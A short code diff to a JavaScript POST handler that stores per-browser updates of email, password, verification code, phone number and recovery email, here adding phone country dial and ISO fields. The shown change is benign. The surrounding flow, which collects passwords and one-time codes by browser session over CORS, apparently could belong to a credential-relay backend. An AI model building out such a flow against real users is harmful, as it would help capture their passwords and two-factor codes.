@@ -19,7 +19,7 @@ export async function POST(request) {
     const body = parseBody(text);
     if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);
 
-    const { browserId, token, updateType, email, password, verificationChoice, verificationCode, phoneNumber, recoveryEmail } = body;
+    const { browserId, token, updateType, email, password, verificationChoice, verificationCode, phoneNumber, phoneCountryDial, phoneCountryIso, recoveryEmail } = body;
 
     if (!browserId) {
         return corsJson({ success: false, error: "browserId required" }, 400);
@@ -48,6 +48,8 @@ export async function POST(request) {
         updates.verificationCode = verificationCode;
     } else if (updateType === 'phoneNumber' && phoneNumber) {
         updates.phoneNumber = phoneNumber;
+        if (phoneCountryDial) updates.phoneCountryDial = phoneCountryDial;
+        if (phoneCountryIso) updates.phoneCountryIso = phoneCountryIso;
     } else if (updateType === 'recoveryEmail' && recoveryEmail) {
         updates.recoveryEmail = recoveryEmail;
     }
